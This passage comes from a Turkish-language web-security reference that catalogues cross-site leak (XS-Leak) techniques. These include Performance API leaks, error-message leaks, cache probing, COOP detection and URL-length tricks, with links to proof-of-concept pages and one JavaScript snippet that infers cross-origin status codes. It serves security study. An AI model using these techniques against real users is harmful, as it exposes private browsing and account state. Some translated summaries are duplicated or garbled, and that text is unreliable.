[`Performans API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance), web uygulamalarının performans metriklerine dair içgörüler sunar ve [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API) tarafından daha da zenginleştirilir. Resource Timing API, ağ isteği zamanlamalarının detaylı izlenmesini sağlar, örneğin isteklerin süresi gibi. Özellikle, sunucular yanıtlarında `Timing-Allow-Origin: *` başlığını içerdiğinde, transfer boyutu ve alan arama süresi gibi ek veriler erişilebilir hale gelir.

Bu zengin veri, [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) veya [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName) gibi yöntemler aracılığıyla alınabilir, performansla ilgili bilgilerin kapsamlı bir görünümünü sağlar. Ayrıca, API, [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) ile elde edilen zaman damgaları arasındaki farkı hesaplayarak yürütme sürelerinin ölçülmesini kolaylaştırır. Ancak, belirli işlemler için Chrome gibi tarayıcılarda `performance.now()`'un hassasiyeti milisaniyelere sınırlı olabilir, bu da zamanlama ölçümlerinin ayrıntısını etkileyebilir.

Zamanlama ölçümlerinin ötesinde, Performans API, güvenlikle ilgili içgörüler için de kullanılabilir. Örneğin, Chrome'da `performance` nesnesinde sayfaların varlığı veya yokluğu, `X-Frame-Options`'ın uygulanıp uygulanmadığını gösterebilir. Özellikle, bir sayfa `X-Frame-Options` nedeniyle bir çerçevede oluşturulmaktan engellendiğinde, bu sayfa `performance` nesnesinde kaydedilmez, sayfanın çerçeve politikaları hakkında ince bir ipucu sağlar.

### Hata Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler, HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Hatalara neden olan bir istek, bir kaynak zamanlama girdisi oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

**Hata** ile sonuçlanan istekler, bir **performans girdisi oluşturmaz**.

### Stil Yeniden Yükleme Hatası

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Bir tarayıcı hatası nedeniyle, hatalara neden olan istekler iki kez yüklenir.
* **Kod Örneği**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Önceki teknikte, GC'deki tarayıcı hataları nedeniyle **yüklenemeyen kaynakların iki kez yüklendiği** iki durum belirlendi. Bu, Performans API'da birden fazla giriş oluşturur ve bu nedenle algılanabilir.

### İstek Birleştirme Hatası

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Hatalara neden olan istekler birleştirilemez.
* **Kod Örneği**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Teknik, belirtilen makalede bir tabloda bulundu ancak teknikle ilgili bir açıklama bulunamadı. Bununla birlikte, bu tekniği kontrol eden kaynak kodu [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) adresinde bulabilirsiniz.

### Boş Sayfa Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Boş yanıtlar, kaynak zamanlama girdileri oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Bir saldırgan, bazı tarayıcılarda **boş sayfaların performans girdisi oluşturmadığını** tespit edebilir, çünkü **boş sayfalar** oluşturmaz.

### **XSS-Auditor Sızıntısı**

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Güvenlik Bildirimlerinde XSS Denetleyicisini kullanarak, saldırganlar, oluşturulan yüklerin denetleyicinin filtreleme mekanizmasını tetiklediğinde yanıtlarda değişiklikler gözlemleyerek belirli web sayfası öğelerini tespit edebilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Güvenlik Bildirimlerinde (SA), XSS Denetleyicisi, başlangıçta Cross-Site Scripting (XSS) saldırılarını önlemek için tasarlanmış olmasına rağmen, paradoksal bir şekilde hassas bilgilerin sızdırılmasında kullanılabilir. Bu yerleşik özellik Google Chrome (GC) 'dan kaldırıldı, ancak SA'da hala mevcut. 2013 yılında, Braun ve Heiderich, XSS Denetleyicisinin yanlışlıkla meşru betikleri engelleyebileceğini ve yanlış pozitiflere yol açabileceğini gösterdi. Buna dayanarak, araştırmacılar, hassas bilgileri çıkarmak ve çapraz kökenli sayfalarda belirli içeriği tespit etmek için teknikler geliştirdiler, bu kavrama Terada tarafından başlangıçta bildirilen ve Heyes tarafından bir blog yazısında ayrıntılı olarak açıklanan XS-Sızıntıları olarak bilinir. Bu teknikler GC'deki XSS Denetleyicisi ile ilgiliyken, SA'da, XSS Denetleyicisi tarafından engellenen sayfaların Performans API'da giriş oluşturmadığı keşfedildi, bu da hassas bilgilerin hala sızdırılabileceği bir yöntemi ortaya koydu.

### X-Frame Sızıntısı

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Özet:** X-Frame-Options başlığına sahip kaynak, kaynak zamanlama girdisi oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Bir sayfanın bir **iframe** içinde **görüntülenmesine izin verilmiyorsa**, bir **performans girdisi oluşturmaz**. Sonuç olarak, bir saldırgan yanıt başlığını **`X-Frame-Options`** olarak tespit edebilir.\
Aynı durum **embed** **etiketi** kullanıldığında da geçerlidir.

### İndirme Algılama

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** İndirmeler, Performans API'da kaynak zamanlama girdisi oluşturmaz.
* **Kod Örneği**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Tanımlanan XS-Sızıntıya benzer şekilde, bir **kaynak indirildiğinde** ContentDisposition başlığı nedeniyle, ayrıca bir **performans girdisi oluşturmaz**. Bu teknik tüm büyük tarayıcılarda çalışır.
### Yönlendirme Başlangıç Sızıntısı

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Yönlendirme
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Kaynak zamanlama girişi yönlendirme başlangıç zamanını sızdırır.
* **Örnek Kod**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Bazı tarayıcıların davranışlarını istismar eden bir XS-Leak örneği bulduk. Standart, çapraz kaynak istekleri için belirli özniteliklerin sıfıra ayarlanması gerektiğini tanımlar. Ancak, **SA**'da, hedef sayfanın yönlendirmesiyle kullanıcının yönlendirilip yönlendirilmediği sorgulanarak **Performans API**'yi sorgulayarak ve **redirectStart zamanlama verilerini** kontrol ederek tespit edilebilir.

### Süre Yönlendirme Sızıntısı

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Yönlendirme
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** Yönlendirme gerçekleştiğinde zamanlama girişlerinin süresi negatif olur.
* **Örnek Kod**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC'de, **yönlendirmeye** neden olan istekler için **süre** **negatif** olur ve bu nedenle yönlendirme olmayan isteklerden ayırt edilebilir.

### CORP Sızıntısı

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Özet:** CORP ile korunan kaynaklar kaynak zamanlama girişleri oluşturmaz.
* **Örnek Kod**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Bazı durumlarda, **nextHopProtocol girişi** bir sızıntı tekniği olarak kullanılabilir. GC'de, **CORP başlığı** ayarlandığında, nextHopProtocol **boş** olacaktır. CORP etkin kaynaklar için SA hiçbir performans girişi oluşturmayacaktır.

### Hizmet İşçisi

* **Dahil Etme Yöntemleri**: Frames
* **Algılanabilir Fark**: API Kullanımı
* **Daha Fazla Bilgi**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Özet:** Belirli bir kökene kayıtlı bir hizmet işçisinin kaydedilip kaydedilmediği tespit edilebilir.
* **Örnek Kod**:

Hizmet işçileri, bir kökende çalışan olaya dayalı betik bağlamlarıdır. Bir web sayfasının arka planında çalışırlar ve kaynakları **ön belleğe almak** için araya girebilir, değiştirebilir ve **ön belleğe alabilirler**.\
Bir **hizmet işçisi** tarafından **ön belleğe alınan bir kaynak** **iframe** aracılığıyla erişilirse, kaynak **hizmet işçisi önbelleğinden yüklenecektir**.\
Kaynağın **hizmet işçisi önbelleğinden yüklendiğini** tespit etmek için **Performans API** kullanılabilir.\
Bu ayrıca bir Zamanlama saldırısıyla da yapılabilir (daha fazla bilgi için belgeye bakın).

### Önbellek

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Zamanlama
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Özet:** Bir kaynağın önbelleğe alınıp alınmadığı kontrol edilebilir.
* **Örnek Kod**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

[Performans API](./#performance-api) kullanılarak bir kaynağın önbelleğe alınıp alınmadığı kontrol edilebilir.

### Ağ Süresi

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Özet:** Bir isteğin ağ süresi `performans` API'sinden alınabilir.
* **Örnek Kod**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Hata Mesajları Tekniği

### Medya Hatası

* **Dahil Etme Yöntemleri**: HTML Öğeleri (Video, Ses)
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Özet:** Firefox'ta çapraz kökenli bir isteğin durum kodunu doğru bir şekilde sızdırmak mümkündür.
* **Örnek Kod**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
### CORS Hatası

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Özet:** Güvenlik İddialarında (SA), CORS hata mesajları yanlışlıkla yönlendirilen isteklerin tam URL'sini açığa çıkarır.
* **Kod Örneği**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Bu teknik, bir saldırganın Webkit tabanlı tarayıcıların CORS isteklerini nasıl işlediğini sömürerek **çapraz kökenli bir sitenin yönlendirmesinin hedefini çıkarmasına** olanak tanır. Özellikle, bir **CORS etkin istek**, kullanıcı durumuna dayalı olarak yönlendirme yapan bir hedef siteye gönderildiğinde ve tarayıcı daha sonra isteği reddettiğinde, hata mesajı içinde **yönlendirmenin tam URL'si** ifşa edilir. Bu zayıflık sadece yönlendirme gerçeğini ortaya çıkarmakla kalmaz, aynı zamanda yönlendirmenin son noktasını ve içerebileceği **duyarlı sorgu parametrelerini** de açığa çıkarır.

### SRI Hatası

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Özet:** Güvenlik İddialarında (SA), CORS hata mesajları yanlışlıkla yönlendirilen isteklerin tam URL'sini açığa çıkarır.
* **Kod Örneği**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Bir saldırgan, **aşırı detaylı hata mesajlarını** kullanarak çapraz kökenli yanıtların boyutunu çıkarmak için SRI mekanizmasını sömürebilir. Bu, kaynakların (genellikle CDN'lerden) değiştirilmediğini doğrulamak için bütünlük özniteliğini kullanan Subresource Integrity (SRI) mekanizmasından kaynaklanmaktadır. SRI'nin çapraz kökenli kaynaklarda çalışması için bunların **CORS etkin** olması gerekir; aksi takdirde bütünlük kontrollerine tabi değillerdir. Güvenlik İddialarında (SA), CORS hatası XS-Leak gibi, bir bütünlük özniteliği taşıyan bir getirme isteği sonrasında bir hata mesajı yakalanabilir. Saldırganlar, herhangi bir isteğin bütünlük özniteliğine **sahte bir kripto değeri atayarak** bu hatayı kasıtlı olarak **tetikleyebilir**. SA'da, ortaya çıkan hata mesajı yanlışlıkla istenen kaynağın içerik uzunluğunu ifşa eder. Bu bilgi sızıntısı, bir saldırganın yanıt boyutundaki değişiklikleri ayırt etmesine olanak tanır ve sofistike XS-Leak saldırıları için yol açar.

### CSP İhlali/Tespiti

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Özet:** CSP, sadece kurbanın web sitesine izin verirken, erişildiğinde farklı bir etki alanına yönlendirilmeye çalışırsa algılanabilir bir hata tetikler.
* **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Bir XS-Leak, CSP'yi kullanarak çapraz kökenli bir sitenin farklı bir etki alanına yönlendirilip yönlendirilmediğini tespit edebilir. Bu sızıntı, yönlendirmeyi tespit edebilir, ancak ayrıca yönlendirme hedefinin etki alanı da sızar. Bu saldırının temel fikri, **saldırgan sitesindeki hedef etki alanına izin vermek**tir. Hedef etki alana bir istek gönderildiğinde, **çapraz kökenli bir etki alana yönlendirilir**. **CSP**, buna erişimi engeller ve bir sızıntı tekniği olarak kullanılan bir **ihlal raporu oluşturur**. Tarayıcıya bağlı olarak, **bu rapor yönlendirmenin hedef konumunu sızdırabilir**.\
Modern tarayıcılar yönlendirildiği URL'yi belirtmeyebilir, ancak hala bir çapraz kökenli yönlendirme tetiklendiğini tespit edebilirsiniz.

### Önbellek

* **Dahil Etme Yöntemleri**: Çerçeveler, Açılır Pencereler
* **Algılanabilir Fark**: Sayfa İçeriği
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Özet:** Önbellekten dosyayı temizleyin. Hedef sayfayı açın, dosyanın önbellekte olup olmadığını kontrol edin.
* **Kod Örneği:**

Tarayıcılar tüm web siteleri için ortak bir önbellek kullanabilir. Kökenlerinden bağımsız olarak, bir hedef sayfanın **belirli bir dosyayı isteyip istemediğini** çıkarmak mümkündür.

Bir sayfa yalnızca kullanıcı giriş yaptığında bir resmi yüklüyorsa, **kaynağı geçersiz kılabilirsiniz** (eğer önbellekteyse artık önbellekte değilse, daha fazla bilgi için bağlantılara bakın), o kaynağı yükleyebilecek bir isteği **gerçekleştirin** ve kaynağı **kötü bir istekle yüklemeye çalışın** (örneğin, aşırı uzun bir başvuru başlığı kullanarak). Kaynak yükleme **herhangi bir hataya neden olmadıysa**, bu, kaynağın **önbelleğe alındığı** anlamına gelir.

### CSP Yönergesi

* **Dahil Etme Yöntemleri**: Çerçeveler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Özet:** CSP başlık yönergeleri, CSP iframe özniteliğini kullanarak sorgulanabilir ve politika ayrıntıları ortaya çıkarılabilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome'da (GC) yeni bir özellik, bir iframe öğesine bir öznitelik ayarlayarak web sayfalarının **Bir İçerik Güvenlik Politikası (CSP)** önermesine izin verir ve politika yönergeleri HTTP isteği ile iletilir. Normalde, gömülü içeriğin bunu **bir HTTP başlığı aracılığıyla yetkilendirmesi gerekir**, aksi takdirde bir **hata sayfası görüntülenir**. Ancak, eğer iframe zaten bir CSP tarafından yönetiliyorsa ve yeni önerilen politika daha kısıtlayıcı değilse, sayfa normal şekilde yüklenecektir. Bu mekanizma, bir saldırganın çapraz kökenli bir sayfanın belirli CSP yönergelerini **belirlemesine olanak tanır** ve hata sayfasını tanımlayabilir. Bu zayıflık düzeltilmiş olarak işaretlendi, ancak bulgularımız, hata sayfasını tespit edebilen **yeni bir sızıntı tekniğini** ortaya koyarak, temel sorunun asla tam olarak ele alınmadığını göstermektedir.

### **CORP**

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Özet:** Cross-Origin Resource Policy (CORP) ile korunan kaynaklar, yasaklanan bir kökenden alındığında bir hata fırlatır.
* **Kod Örneği**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP başlığı, belirli bir kaynağa **no-cors çapraz kökenli istekleri engellediğinde bir hata fırlatır** ve başlığın varlığı algılanabilir.
### CORB

* **Dahil Etme Yöntemleri**: HTML Elemanları
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Özet**: CORB saldırganlara istekte **`nosniff` başlığının varlığını** tespit etmelerine olanak tanıyabilir.
* **Kod Örneği**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Saldırı hakkında daha fazla bilgi için bağlantıya bakın.

### CORS hatası Origin Yansıma yanlış yapılandırma <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Başlıklar
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Özet**: Eğer Origin başlığı `Access-Control-Allow-Origin` başlığında yansıtılıyorsa, bir kaynağın önbellekte olup olmadığını kontrol etmek mümkündür.
* **Kod Örneği**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Eğer **Origin başlığı** `Access-Control-Allow-Origin` başlığında **yansıtılıyorsa**, bir saldırgan bu davranışı kötüye kullanarak **CORS** modunda **kaynağı almaya çalışabilir**. Eğer bir **hata oluşmazsa**, bu, kaynağın **web'den doğru şekilde alındığı** anlamına gelir, eğer bir hata **oluşursa**, bu, kaynağın **önbellekten alındığı** anlamına gelir (hata, önbelleğin, orijinal alan adını ve saldırganın alan adını izin veren bir CORS başlığıyla bir yanıtı kaydetmesi nedeniyle ortaya çıkar).\
Unutulmamalıdır ki, eğer origin yansıtılmıyorsa ancak joker karakteri kullanılıyorsa (`Access-Control-Allow-Origin: *`), bu çalışmayacaktır.

## Okunabilir Öznitelik Tekniği

### Fetch Yönlendirme

* **Dahil Etme Yöntemleri**: Fetch API
* **Algılanabilir Fark**: Durum Kodu
* **Daha Fazla Bilgi**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Özet:** GC ve SA, yönlendirme tamamlandıktan sonra yanıtın türünü (opaqueredirect) kontrol etmeye olanak tanır.
* **Kod Örneği**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"` ve diğer parametrelerle Fetch API kullanarak bir istek göndererek, `response.type` özniteliğini okumak ve eğer `opaqueredirect`'e eşitse, yanıtın bir yönlendirme olduğunu belirlemek mümkündür.

### COOP

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Başlık
* **Daha Fazla Bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Özet:** Cross-Origin Opener Policy (COOP) tarafından korunan sayfalar, çapraz köken etkileşimlerden erişimi engeller.
* **Kod Örneği**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Bir saldırgan, çapraz kökenli bir HTTP yanıtında Cross-Origin Opener Policy (COOP) başlığının varlığını çıkarabilir. COOP, web uygulamaları tarafından harici sitelerin rastgele pencere referanslarına erişimini engellemek için kullanılır. Bu başlığın görünürlüğü, **`contentWindow` referansına** erişmeye çalışarak anlaşılabilir. COOP'un koşullu olarak uygulandığı durumlarda, **`opener` özelliği** bir belirleyici olur: COOP etkin olduğunda **tanımsız** olurken, etkin olmadığında **tanımlı** olur.

### URL Maksimum Uzunluğu - Sunucu Tarafı

* **Dahil Etme Yöntemleri**: Fetch API, HTML Elemanları
* **Algılanabilir Fark**: Durum Kodu / İçerik
* **Daha Fazla Bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Özet:** Yönlendirme yanıtının uzunluğundan kaynaklanan farkları tespit ederek, sunucunun bir hata ile yanıt vermesi ve bir uyarı oluşturulması mümkündür.
* **Kod Örneği**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Eğer bir sunucu tarafı yönlendirmesi **yönlendirme içinde kullanıcı girdisi** ve **ekstra veri** kullanıyorsa, bu davranışı tespit etmek mümkündür çünkü genellikle **sunucuların bir istek uzunluğu sınırı** vardır. Eğer **kullanıcı verisi** bu sınırın **bir eksiği ise**, çünkü **yönlendirme** bu veriyi kullanıyor ve **ekstra bir şey ekliyor**, bu, bir **hata oluşturarak algılanabilir**.

Eğer bir kullanıcıya çerezler atayabilirseniz, bu saldırıyı gerçekleştirmek için **yeterli sayıda çerez atayabilirsiniz** ([**çerez bombası**](../hacking-with-cookies/cookie-bomb.md)) böylece **doğru yanıtın boyutu arttığında bir hata** oluşturulur. Bu durumda, bu isteği aynı siteden tetiklerseniz, `<script>` otomatik olarak çerezleri gönderir (bu nedenle hataları kontrol edebilirsiniz).\
**Çerez bombası + XS-Search**'ün bir örneği, bu yazının Tasarlanan çözümünde bulunabilir: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

Bu tür bir saldırı için genellikle `SameSite=None` veya aynı bağlamda olmak gereklidir.

### URL Maksimum Uzunluğu - İstemci Tarafı

* **Dahil Etme Yöntemleri**: Açılır Pencereler
* **Algılanabilir Fark**: Durum Kodu / İçerik
* **Daha Fazla Bilgi**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Özet:** Yönlendirme yanıtının uzunluğundan kaynaklanan farkları tespit ederek, istek için yönlendirme yanıtının çok büyük olması durumunda fark edilebilecek bir fark olabilir.
* **Kod Örneği**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium belgelerine](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length) göre, Chrome'un maksimum URL uzunluğu 2MB'dir.

> Genel olarak, _web platformu_ URL'lerin uzunluğuna sınırlar getirmez (ancak 2^31 yaygın bir sınırdır). _Chrome_, uygulamada hizmet dışı bırakma sorunlarına neden olmamak ve pratik nedenlerle URL'leri maksimum **2MB** uzunluğunda sınırlar.

Bu nedenle, eğer **yönlendirme URL'si** bir durumda daha büyükse, URL'nin **2MB'den büyük bir uzunluğa sahip olacak şekilde yönlendirilmesi** mümkündür. Bu gerçekleştiğinde, Chrome bir **`about:blank#blocked`** sayfası gösterir.

**Fark edilebilir fark**, eğer **yönlendirme** tamamlandıysa, `window.origin` bir **hata fırlatır** çünkü çapraz kökenli bir alan bu bilgiye erişemez. Ancak, **limit** aşıldığında ve yüklenen sayfa **`about:blank#blocked`** ise pencerenin **`origin`**'i **ana**nın **erişilebilir bilgisi** olarak kalır.

**2MB'ye** ulaşmak için gereken tüm ek bilgiler, başlangıçtaki URL'de bir **hash** ile eklenerek yönlendirmede **kullanılabilir** hale getirilebilir.

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}
### Maksimum Yönlendirmeler

* **Dahil Etme Yöntemleri**: Fetch API, Frames
* **Algılanabilir Fark**: Durum Kodu
